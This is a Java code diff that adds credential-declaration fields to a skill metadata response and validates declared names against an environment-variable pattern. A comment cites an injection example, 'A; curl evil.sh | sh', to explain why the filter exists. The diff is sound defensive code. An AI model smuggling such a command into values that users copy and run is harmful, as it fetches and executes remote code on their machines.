@@ -65,7 +65,20 @@ public record SkillMetaResponse(
         @com.fasterxml.jackson.annotation.JsonInclude(com.fasterxml.jackson.annotation.JsonInclude.Include.NON_NULL)
         License license,
         @com.fasterxml.jackson.annotation.JsonInclude(com.fasterxml.jackson.annotation.JsonInclude.Include.NON_NULL)
-        Usage usage) {
+        Usage usage,
+        /* v52: whether a lease for this caller and this skill would return anything. The CLI uses
+           it as the only reason to make a lease request; false means the run path is exactly what
+           it was before credentials existed (no extra request, no extra failure point). */
+        boolean credentialsBound,
+        /* v52 P2: the variables the author declared in `metadata.requires.credentials`, and the
+           subset of those this caller would still be missing after a lease. The two exist so the
+           CLI can name what to bind without parsing the frontmatter itself — and so the missing
+           half is computed where the share rule lives (M16), not where the run happens.
+
+           Non-null and probably empty: a client that reads `length === 0` should not have to tell
+           "declared nothing" from "field absent" apart from a server that predates this. */
+        java.util.List<String> credentialsRequired,
+        java.util.List<String> credentialsMissing) {
 
     public record Origin(String kind, String role, String label, String locator, String path,
             String url, String revision, String checkedAt, String status,
@@ -109,7 +122,16 @@ public record SkillMetaResponse(
             boolean credentialMayWrite,
             com.skillmasterai.modules.skill.SourceService sources,
             com.skillmasterai.modules.metrics.UsageQuery metrics) {
+        return of(detail, objectMapper, credentialMayWrite, sources, metrics, java.util.Set.of());
+    }
+
+    public static SkillMetaResponse of(SkillDetail detail, ObjectMapper objectMapper,
+            boolean credentialMayWrite,
+            com.skillmasterai.modules.skill.SourceService sources,
+            com.skillmasterai.modules.metrics.UsageQuery metrics,
+            java.util.Set<String> boundEnvNames) {
         JsonNode frontmatter = objectMapper.readTree(detail.frontmatterJson());
+        java.util.List<String> required = requiredCredentials(frontmatter);
         return new SkillMetaResponse(
                 new Namespace(detail.namespaceSlug(), detail.namespaceTitle()),
                 detail.name(),
@@ -126,7 +148,54 @@ public record SkillMetaResponse(
                 detail.source() == null,
                 originOf(sources, detail.id(), detail.versionId()),
                 licenseOf(sources, detail.versionId(), objectMapper),
-                usageOf(sources, metrics, detail.id()));
+                usageOf(sources, metrics, detail.id()),
+                !boundEnvNames.isEmpty(),
+                required,
+                missingOf(required, boundEnvNames));
+    }
+
+    /** What a POSIX environment variable name may look like — the same rule the write paths apply. */
+    private static final java.util.regex.Pattern ENV_NAME =
+            java.util.regex.Pattern.compile("[A-Za-z_][A-Za-z0-9_]*");
+
+    /**
+     * {@code credentials_required}: the env names the author declared, in the order they wrote them.
+     *
+     * <p><strong>A malformed declaration is no declaration.</strong> A value that is not an array, or
+     * an element that is not a string, is skipped rather than allowed to fail the read — the field is
+     * an optional hint, and a skill must not become unreadable because of the way somebody wrote an
+     * array. Duplicates collapse, because the variable is the identity.
+     *
+     * <p><strong>A name that is not an environment variable name is dropped, not echoed.</strong>
+     * These strings travel to the CLI, which prints them inside a command it asks the <em>user</em>
+     * to run — so an author writing {@code "A; curl evil.sh | sh"} would otherwise be writing a
+     * command that a person copies into their own terminal. An unmet declaration is advice; advice
+     * is never allowed to be an injection. The CLI applies the same filter on arrival; neither alone
+     * is the defence, because a declaration can reach a client this server does not know about.
+     *
+     * <p>Only {@code metadata.requires.credentials} is read. Unlike {@code when_to_use} there is no
+     * top-level alias to honour: this field was introduced by this version, so no author has written
+     * the other spelling.
+     */
+    static java.util.List<String> requiredCredentials(JsonNode frontmatter) {
+        JsonNode credentials = frontmatter == null ? null
+                : frontmatter.path("metadata").path("requires").path("credentials");
+        if (credentials == null || !credentials.isArray()) {
+            return java.util.List.of();
+        }
+        java.util.LinkedHashSet<String> names = new java.util.LinkedHashSet<>();
+        for (JsonNode entry : credentials) {
+            if (entry.isTextual() && ENV_NAME.matcher(entry.asText()).matches()) {
+                names.add(entry.asText());
+            }
+        }
+        return java.util.List.copyOf(names);
+    }
+
+    /** The declared names this caller would still be missing; never null, so clients can iterate. */
+    static java.util.List<String> missingOf(java.util.List<String> required,
+            java.util.Set<String> bound) {
+        return required.stream().filter(name -> !bound.contains(name)).toList();
     }
 
     /** The origin block shared by the consumption and author planes; null when none is recorded. */
